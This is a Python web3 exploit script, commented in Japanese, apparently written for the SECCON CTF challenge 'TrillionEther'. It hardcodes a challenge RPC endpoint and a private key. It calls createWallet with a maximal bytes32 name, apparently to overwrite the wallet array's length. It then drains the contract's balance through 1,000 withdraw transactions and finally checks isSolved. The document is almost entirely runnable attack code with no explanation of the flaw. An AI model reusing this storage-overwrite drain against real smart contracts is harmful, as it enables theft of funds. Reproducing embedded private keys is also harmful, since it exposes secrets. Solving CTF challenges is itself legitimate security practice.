from web3 import Web3
from eth_abi import encode
# 接続情報を設定
rpc_endpoint = 'http://trillion-ether.seccon.games:8545/89eadf0b-7b83-48b5-92a1-00b3490e9cc0'
private_key = '1e832d2d17c06305b10152d473afd3c5fcde4415577055458084d5bad0ce5efd'
challenge_contract_address = '0x0Cc3cfAb1Cf71d4E02Bf639d1B54B00Ad91A27A5'
# 既知のウォレットアドレス
target_wallet_address = '0x476f1784a537975dFA8A2e74345C6ce1FBb74f11'
    
# コントラクトのABIhttp://trillion-ether.seccon.games:8545/d886ab6f-050b-4710-8c81-fff648b2aed4
abi = [
    {
        "inputs": [],
        "stateMutability": "payable",
        "type": "constructor"
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "bytes32",
                "name": "name",
                "type": "bytes32"
            }
        ],
        "name": "createWallet",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "uint256",
                "name": "fromWalletId",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "toWalletId",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "transfer",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "uint256",
                    "name": "walletId",
                    "type": "uint256"
                },
                {
                    "internalType": "uint256",
                    "name": "amount",
                    "type": "uint256"
                }
            ],
            "name": "withdraw",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "wallets",
            "outputs": [
                {
                    "components": [
                        {
                            "internalType": "bytes32",
                            "name": "name",
                            "type": "bytes32"
                        },
                        {
                            "internalType": "uint256",
                            "name": "balance",
                            "type": "uint256"
                        },
                        {
                            "internalType": "address",
                            "name": "owner",
                            "type": "address"
                        }
                    ],
                    "internalType": "struct TrillionEther.Wallet[]",
                    "name": "",
                    "type": "tuple[]"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        }
    ]



# Web3の初期化
w3 = Web3(Web3.HTTPProvider(rpc_endpoint))
account = w3.eth.account.from_key(private_key)
contract = w3.eth.contract(address=challenge_contract_address, abi=abi)


def exploit():
    
    # ステップ1: wallets.lengthを大きな値に設定
    large_number = 2 ** 256 - 1
    name = large_number.to_bytes(32, 'big')
    tx = contract.functions.createWallet(name).build_transaction({
        'from': account.address,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas': 500000,
        'gasPrice': w3.to_wei('1', 'gwei'),
        'value': 0
    })
    signed_tx = w3.eth.account.sign_transaction(tx, private_key=private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    if receipt.status == 1:
        print("Step 1: wallets.lengthを上書きしました。")
    else:
        print("Step 1: wallets.lengthの上書きに失敗しました。")
        return
    
    # ステップ2: wallet_idを特定
    wallet_id = 0
    if wallet_id is not None:
        print(f"Found wallet_id: {wallet_id} for address: {target_wallet_address}")
    else:
        print(f"Wallet with address {target_wallet_address} not found.")
        return
    
    # ステップ3: コントラクトの残高を取得
    contract_balance = w3.eth.get_balance(challenge_contract_address)
    print(f"Contract balance: {contract_balance}")
    
    # ステップ4: withdrawを実行
    
    # ステップ4: withdrawを数回に分けて実行
    # ここでは、コントラクト残高を10分割して引き出す例を示します
    number_of_withdrawals = 1000
    amount_to_withdraw = contract_balance // number_of_withdrawals
    total_withdrawn = 0

    for i in range(number_of_withdrawals):
        # 最後の引き出しでは残り全額を引き出す
        if i == number_of_withdrawals - 1:
            amount = contract_balance - total_withdrawn
        else:
            amount = amount_to_withdraw

        try:
            tx_withdraw = contract.functions.withdraw(wallet_id, amount).build_transaction({
                'from': account.address,
                'nonce': w3.eth.get_transaction_count(account.address),
                'gas': 1000000,  # 必要に応じて調整
                'gasPrice': w3.to_wei('1', 'gwei'),
            })
            signed_tx_withdraw = w3.eth.account.sign_transaction(tx_withdraw, private_key=private_key)
            tx_hash_withdraw = w3.eth.send_raw_transaction(signed_tx_withdraw.raw_transaction)
            receipt_withdraw = w3.eth.wait_for_transaction_receipt(tx_hash_withdraw)
            
            if receipt_withdraw.status == 1:
                print(f"Step 4.{i+1}: {amount} weiを引き出しました。")
                total_withdrawn += amount
            else:
                print(f"Step 4.{i+1}: withdrawに失敗しました。")
                break
        except Exception as e:
            print(f"Step 4.{i+1}: エラーが発生しました - {str(e)}")
            break
    # ステップ5: isSolved() を確認
    solved = contract.functions.isSolved().call()
    print(f"Step 5: isSolved() = {solved}")

if __name__ == '__main__':
    exploit()
